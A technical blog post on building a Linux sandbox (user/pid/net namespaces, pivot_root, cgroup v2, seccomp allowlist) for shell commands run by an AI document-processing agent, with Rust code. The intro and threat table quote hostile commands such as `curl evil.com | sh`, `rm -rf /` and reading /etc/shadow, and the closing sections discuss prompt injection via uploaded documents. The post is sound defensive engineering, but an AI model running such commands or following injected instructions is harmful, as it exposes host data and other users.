---
title: 'Assume the model cooperates with the attacker'
summary: 'An AI agent runs shell commands that did not exist until a prompt asked for them. You cannot write a static policy for code that has not been written yet, so the containment has to hold even when the model is talked into helping.'
order: 1
published: 2026-08-02
---

An AI agent writes `rm -rf /` and your system runs it.

This isn't hypothetical. AI coding agents run shell commands as part of normal operation. File operations, package installs, test runs, data processing. From the agent's perspective, `pip install pandas` and `curl evil.com | sh` are both just commands. Something outside the model has to draw the line.

Traditional sandboxing assumes you know what code will run. You write a seccomp profile, allow a specific set of syscalls, pin a container image. AI agents break that assumption. The code is generated at runtime, from a user prompt, and it can be anything. A data processing script. A web scraper. A one-liner that reads `/etc/shadow`. You can't write a static policy for code that doesn't exist yet.

Take a concrete case study, the kind of thing you'd build in a weekend to see where it breaks: a document processing agent that runs arbitrary shell commands on behalf of users, many sessions on one shared host, each uploading files the agent reads and transforms. The first problem is containment. How do you stop one session's agent from touching another session's files, reading secrets off the host, or eating every resource on the machine?

The common answer is containers. Spin one up per session, throw it away when the session ends. It works, but it's heavy. Container startup adds latency, each one carries its own filesystem layer, and you need an orchestrator to manage the lifecycle. When sessions start and stop constantly, that overhead adds up fast.

I went a different direction. Twice, as it turned out, because the first attempt taught me what the second one had to be.

## The first attempt, and what was wrong with it

The first sandbox was the oldest trick in Unix. A fresh Linux user per session, named after a hash of the session id. Home directories at mode 750 so sessions couldn't see into each other. `sudo -u` to drop into that user, with `env_reset` scrubbing the environment on the way down. `prlimit` for process count, address space and file size. A process group, so the timeout could take backgrounded children with it.

It held against everything I threw at it. But it had a shape I grew uncomfortable with. The sandboxed process could still _see_ the host. Every process in `ps`, every mount, every network interface, every file that happened to be world-readable. That's a denylist. And the whole thesis of this post is that denylists are the wrong shape for code you haven't read yet.

It also leaned on `sudo`, which meant the web application ran as something with sudo rights. That's a lot of trust to hand a process that talks to the internet.

So the second attempt moves the boundary from "what you may access" to "what exists." Linux has all the pieces: namespaces, cgroup v2, `pivot_root`, seccomp. A container is those pieces in a convenient box. I wanted the pieces without the box.

## Root inside the box, nobody outside it

The agent's host process runs unprivileged. To execute a command, it forks a child that calls `unshare` with six flags: user, pid, mount, net, uts and ipc.

The user namespace goes first because it makes the rest possible without root. Inside it, the child is uid 0 with a full set of capabilities over namespaces it created, and precisely nothing over the host. That is the trick the whole design turns on. The process can mount filesystems, build its own root, and install a seccomp filter, and none of that authority reaches past the namespace boundary.

Here is the same idea in Rust with the `nix` crate, which wraps the syscalls in types instead of leaving you with a `ctypes` prototype and a prayer:

```rust
use nix::sched::{unshare, CloneFlags};

fn enter_namespaces() -> nix::Result<()> {
    unshare(
        CloneFlags::CLONE_NEWUSER
            | CloneFlags::CLONE_NEWPID
            | CloneFlags::CLONE_NEWNS
            | CloneFlags::CLONE_NEWNET
            | CloneFlags::CLONE_NEWUTS
            | CloneFlags::CLONE_NEWIPC,
    )
}
```

One wrinkle: a new PID namespace applies to the _next_ fork, not the calling process. So the sequence is unshare, then fork, and the child of that fork becomes PID 1 of a process tree that contains nothing else. When it exits, the kernel kills everything under it. No more chasing orphans.

Then a small init program runs inside the namespaces and builds the world the command will see. Every step depends on the one before it, and the order is not negotiable.

### Build the filesystem from nothing

Instead of hiding host paths, start from an empty tmpfs and mount in only what the command needs. The host userspace comes in read-only. The session workspace comes in writable. Then the uploads directory is bound read-only _on top of_ the writable workspace, so the agent can read what the user gave it and cannot alter it. Not because a rule says so. Because the mount table says so.

```rust
use nix::mount::{mount, MsFlags};
use std::path::Path;

fn build_root(root: &Path, workspace: &Path) -> nix::Result<()> {
    // Anything mounted from here on stays inside this namespace.
    let none: Option<&str> = None;
    mount(none, "/", none, MsFlags::MS_REC | MsFlags::MS_PRIVATE, none)?;

    // An empty root. Everything else is opt-in.
    let tmpfs = MsFlags::MS_NOSUID | MsFlags::MS_NODEV;
    mount(Some("tmpfs"), root, Some("tmpfs"), tmpfs, Some("size=64m"))?;

    for dir in ["usr", "lib", "lib64", "bin", "sbin"] {
        let src = Path::new("/").join(dir);
        if src.exists() {
            bind(&src, &root.join(dir), true)?;
        }
    }

    bind(workspace, &root.join("workspace"), false)?;
    bind(&workspace.join("uploads"), &root.join("workspace/uploads"), true)?;

    let noexec = tmpfs | MsFlags::MS_NOEXEC;
    mount(Some("tmpfs"), &root.join("tmp"), Some("tmpfs"), noexec, Some("size=32m"))?;
    mount(Some("proc"), &root.join("proc"), Some("proc"), noexec, none)?;
    Ok(())
}

fn bind(src: &Path, dst: &Path, readonly: bool) -> nix::Result<()> {
    let _ = std::fs::create_dir_all(dst);
    let flags = MsFlags::MS_BIND | MsFlags::MS_REC;
    mount(Some(src), dst, None::<&str>, flags, None::<&str>)?;
    if readonly {
        // A read-only bind takes two calls. Asking for both at once is
        // accepted and silently ignored on older kernels.
        let ro = flags | MsFlags::MS_REMOUNT | MsFlags::MS_RDONLY | MsFlags::MS_NOSUID;
        mount(Some(src), dst, None::<&str>, ro, None::<&str>)?;
    }
    Ok(())
}
```

`/dev` gets exactly three nodes: null, zero and urandom. `/etc` gets the handful of files that LibreOffice, fontconfig and `getpwuid` complain without. `/tmp` is a private, size-capped tmpfs with `noexec`, so the classic move of writing a binary to `/tmp` and running it fails at `execve`.

Then the swap:

```rust
use nix::mount::{umount2, MntFlags};
use nix::unistd::{chdir, pivot_root};

fn swap_root(root: &Path) -> nix::Result<()> {
    let stale = root.join(".host");
    let _ = std::fs::create_dir_all(&stale);

    pivot_root(root, &stale)?;
    chdir("/")?;
    umount2("/.host", MntFlags::MNT_DETACH)?;
    let _ = std::fs::remove_dir("/.host");

    let ro = MsFlags::MS_REMOUNT | MsFlags::MS_RDONLY | MsFlags::MS_NOSUID | MsFlags::MS_NODEV;
    mount(None::<&str>, "/", None::<&str>, ro, None::<&str>)
}
```

After `pivot_root` and the detach, the host filesystem is not hidden. It is gone. There's no path to it, no file descriptor pointing into it, nothing to traverse. `/etc/shadow` isn't forbidden, it doesn't exist.

### The network namespace is the firewall

`CLONE_NEWNET` gives the process a network namespace containing a single loopback interface, and it's down. No routes, no other interfaces, no way to reach the host's stack. A `urlopen` inside the sandbox fails at `connect`, not at a firewall rule someone has to remember to keep. An agent that has been talked into exfiltrating an upload has nowhere to send it.

The first attempt would have needed an `iptables` rule per sandbox uid for this. A firewall rule is a thing you add. An empty namespace is the absence of a thing.

### cgroups instead of prlimit

`prlimit` limits are per process. A fork bomb with a hundred children is under the per-process address-space cap a hundred times over. And `RLIMIT_AS` bounds virtual memory, which isn't what you're actually short of.

cgroup v2 meters the tree. One cgroup per session, four files written into it:

```rust
use std::fs;
use std::path::{Path, PathBuf};

struct SessionCgroup(PathBuf);

impl SessionCgroup {
    fn create(base: &Path, session: &str) -> std::io::Result<Self> {
        let dir = base.join(format!("sandbox-{session}"));
        fs::create_dir(&dir)?;
        fs::write(dir.join("memory.max"), "4294967296")?;
        fs::write(dir.join("memory.swap.max"), "0")?;
        fs::write(dir.join("pids.max"), "100")?;
        fs::write(dir.join("cpu.max"), "400000 100000")?;
        Ok(Self(dir))
    }

    fn adopt(&self, pid: u32) -> std::io::Result<()> {
        fs::write(self.0.join("cgroup.procs"), pid.to_string())
    }

    fn kill_tree(&self) -> std::io::Result<()> {
        fs::write(self.0.join("cgroup.kill"), "1")
    }
}

impl Drop for SessionCgroup {
    fn drop(&mut self) {
        let _ = self.kill_tree();
        let _ = fs::remove_dir(&self.0);
    }
}
```

Same numbers as before. What changed is what they count: the whole tree, not one process at a time.

`cgroup.kill` is the part I'd been missing for years. Write a `1` to it and the kernel kills every process in the group atomically. There is no window where a child forks between your read of the pid list and your loop of `kill` calls. On timeout, that's the whole cleanup.

There's a race on the way in, too. The child has to be in the cgroup _before_ it execs the command, or the command runs for a moment under no limits at all. The obvious fix is a `pre_exec` hook that writes the pid, but that runs your code between `fork` and `exec` in a child of a threaded server, where any lock another thread held at fork time is held forever. It's the kind of bug that shows up once a week and never under a debugger.

So the child is a tiny shell launcher that blocks on stdin. The parent writes the pid into the cgroup, then writes one byte. If the cgroup write fails, the parent closes the pipe instead, `read` fails, and the `&&` means the command never runs.

```rust
use std::io::Write;
use std::process::{Command, Stdio};

let mut child = Command::new("/bin/sh")
    .args(["-c", r#"read _ && exec "$@" </dev/null"#, "launcher"])
    .args(&sandbox_argv)
    .stdin(Stdio::piped())
    .stdout(Stdio::piped())
    .stderr(Stdio::piped())
    .spawn()?;

cgroup.adopt(child.id())?; // on error: stdin drops, read fails, no exec
child.stdin.take().unwrap().write_all(b"\n")?;
```

No code of mine runs in the child before exec. Failure is fail-closed by construction, not by a check I remembered to write.

### seccomp goes last

The first attempt skipped seccomp because a denylist of syscalls is a guessing game. The second installs an allowlist, and that changes the calculus. Anything not on the list kills the process. A syscall the kernel gains next year is blocked without anyone updating a file.

The list came from running the workloads the case study needs under `strace` and keeping what they touched: CPython, Node, pandas, openpyxl, a shell and coreutils, plus a margin of ordinary libc traffic, minus everything privileged. `mount`, `ptrace`, `unshare`, `setns`, `bpf`, `keyctl`, the module and kexec families. None of it is enumerated as denied. It's simply not present.

Classic BPF has an eight-bit jump offset, so a filter with a few hundred entries can't use one shared "allow" target. Interleave each check with its own return and every jump is 0 or 1:

```rust
#[repr(C)]
struct Insn { code: u16, jt: u8, jf: u8, k: u32 }

const LD_W_ABS: u16 = 0x20;
const JEQ_K: u16 = 0x15;
const JSET_K: u16 = 0x45;
const RET_K: u16 = 0x06;

const KILL: u32 = 0x8000_0000;
const ALLOW: u32 = 0x7fff_0000;
const ENOSYS: u32 = 0x0005_0000 | 38;

fn filter(arch: u32, allow: &[u32], degrade: &[u32]) -> Vec<Insn> {
    let i = |code, jt, jf, k| Insn { code, jt, jf, k };
    let mut p = vec![
        i(LD_W_ABS, 0, 0, 4),         // seccomp_data.arch
        i(JEQ_K, 1, 0, arch),         // right arch: skip the kill
        i(RET_K, 0, 0, KILL),
        i(LD_W_ABS, 0, 0, 0),         // seccomp_data.nr
        i(JSET_K, 0, 1, 0x4000_0000), // x32 bit set: fall into the kill
        i(RET_K, 0, 0, KILL),
    ];
    for &nr in degrade {
        p.push(i(JEQ_K, 0, 1, nr));
        p.push(i(RET_K, 0, 0, ENOSYS));
    }
    for &nr in allow {
        p.push(i(JEQ_K, 0, 1, nr));
        p.push(i(RET_K, 0, 0, ALLOW));
    }
    p.push(i(RET_K, 0, 0, KILL));
    p
}
```

The architecture check at the top matters on x86_64, where a process can switch to the 32-bit ABI and syscall numbers mean something else entirely. The x32 check is the same idea one bit over.

The `degrade` set is the one concession to practicality. Node's event loop probes `io_uring` at startup and falls back cleanly on `ENOSYS`, but dies if the probe kills the process. So those few calls return "not implemented" instead of a corpse.

And the filter installs last, after `no_new_privs`, after the mounts, after `pivot_root`. It has to. It blocks `mount` and `pivot_root`, which init just finished using. That's the ordering argument for doing this in a language that makes ordering visible: set the limit after the spawn, or drop a privilege after opening the file, and you have a race that no test catches and no error reports. The program works. It just isn't secure.

### The environment

The command's environment is built from four variables: `PATH`, `HOME`, `TMPDIR` and `NODE_PATH`. Not filtered from the parent's. Built. Nothing the host process knows leaks through, because there is no channel for it to leak through.

Callers can add variables, with a short denylist that refuses `LD_PRELOAD`, `PYTHONPATH`, `NODE_OPTIONS`, `BASH_ENV` and their friends. Those are the ones that make an interpreter load code before your code, and no legitimate caller needs them.

Every file descriptor above 2 gets closed before `execve`. Then `sh -c` with the command string as one argument, so metacharacters have nothing to escape into.

### Refuse to start if the kernel can't do this

Startup checks that unprivileged user namespaces work, that the cgroup subtree accepts limit writes, that the memory, pids and cpu controllers are delegated, that `cgroup.kill` exists, and that `CONFIG_SECCOMP` is on. If any of that is missing, the process refuses to start. Degrading to "run it anyway, just without the sandbox" is the failure mode this whole design exists to prevent.

## Which layer stops what

Outermost to innermost: the model's refusal, a command allowlist and path checks in the agent's own code, then the mount table, the namespaces, cgroups and seccomp. Only the first two are my code. The rest is the kernel, and the kernel is the one I'm counting on.

| What an attacker tries                      | What stops it                                                     |
| ------------------------------------------- | ----------------------------------------------------------------- |
| Read another session's files                | Not mounted. The path doesn't exist inside the namespace.         |
| Read `/etc/shadow` or `/root`               | Not mounted. Host root was detached by `pivot_root`.              |
| Modify or delete an upload                  | Read-only bind on top of the writable workspace.                  |
| Leak API keys through the environment       | The environment is built from four names, not inherited.          |
| Exfiltrate over the network                 | Empty network namespace. `connect` fails.                         |
| Escalate via a setuid binary                | `nosuid` mounts and `no_new_privs`.                               |
| Write a binary to `/tmp` and run it         | `noexec` tmpfs.                                                   |
| `ptrace`, `mount`, `unshare`, load a module | Not on the syscall allowlist. The process is killed.              |
| Fork bomb, memory exhaustion                | `pids.max`, `memory.max`, swap off.                               |
| Escape the timeout with `sleep 999 &`       | `cgroup.kill` takes the whole tree. PID 1 exiting takes the rest. |
| `rm -rf /`, `curl \| sh`                    | Refused by the model, and the root is read-only underneath.       |

The way to test a table like this is twice over. First ask the agent to break out, in plain language, and watch what it tries. Then run the same attacks as the sandboxed process directly, without a model in the loop. The philosophy behind the second half is the title of this post. Assume the model _will_ be convinced to attempt hostile actions, whether by a direct prompt or by instructions buried in an uploaded document. The security model can't depend on refusal. It has to hold when the model is helping the attacker.

## What this design doesn't do

**Disk.** cgroups meter memory, processes and CPU. They don't meter disk. The tmpfs mounts are size-capped and a per-file limit caps any single write, but the workspace sits on a real filesystem, and a per-file cap says nothing about the number of files. The tool for this lives a layer down: a filesystem quota per workspace. XFS project quotas do it cleanly, a loop-mounted image per session does it anywhere. Either way it belongs to the host. The agent should assume the ceiling exists and handle `ENOSPC` gracefully, and that is all it should assume.

**The kernel.** Every session shares one kernel with the host. Namespaces and seccomp shrink the attack surface a great deal, but user namespaces have a CVE history of their own, and an allowlist of a few hundred syscalls is still a few hundred syscalls. If the threat model includes a kernel exploit from inside the sandbox, this design is not the answer.

**Prompt injection** isn't a sandbox gap, it's the reason the sandbox exists. Upload a document with instructions embedded in it and the agent may well follow them. Containment bounds the blast radius. It doesn't stop the agent from trying. Nobody has a production-ready answer to this today, which is why I treat containment as the real defense and refusal as a bonus.

## Where this sits

The first attempt was the lightest thing on the spectrum: users and permissions, auditable in an afternoon. The second sits a step up. It's most of what a container runtime does, with no image, no daemon and no per-session filesystem layer, and it starts in the time it takes to fork.

**NVIDIA OpenShell** arrived in 2026 as an open-source sandbox runtime built for agents. Linux Security Modules driven by declarative YAML: which paths the agent can read, which endpoints it can reach, which process types it can spawn, with policy sections you can tighten mid-session. More expressive than anything here, at the cost of understanding LSM and running a daemon next to your application.

**Firecracker** is Amazon's microVM monitor, written in Rust. Each workload gets its own kernel on KVM, so even a kernel exploit inside the sandbox stays inside it. About 125ms to start, around 5MB per instance. If your threat model includes kernel-level attacks, this is the right answer. For a document processing chatbot it's overkill.

**Daytona** comes from the other side: full development environments with pre-installed toolchains, network isolation and persistent storage. Built for humans, works for agents, and the heaviest of the lot.

Roughly: a shared kernel you're willing to trust and minimal per-session overhead, namespaces and cgroups. Policy-driven access control at scale, OpenShell. A kernel-exploit-grade threat model, Firecracker. Pre-configured toolchains, Daytona.

## What's left

The sandbox handles the problems I know how to solve. Cross-session access, privilege escalation, secret leaks, exfiltration, resource exhaustion. Standard Linux primitives, nothing new.

What's left is harder. Disk quotas need the host. Audit logging needs to capture not just what the agent did but what it _tried_ to do and was stopped from doing, across every layer, in a form someone would actually read.

And there's a meta-problem underneath all of it. Every new tool you hand the agent, web search, file conversion, database access, is a new capability the sandbox has to account for. The attack surface grows with the feature set, and it grows on the side that ships features.

Every layer above the kernel is a filter I hope is working: the allowlist I wrote, the path check I remembered, the refusal the model produced this time. An empty network namespace is not that kind of thing. The kernel has no opinion about the prompt, can't be flattered, and doesn't get talked into anything. That's the whole reason the guarantee lives down there.
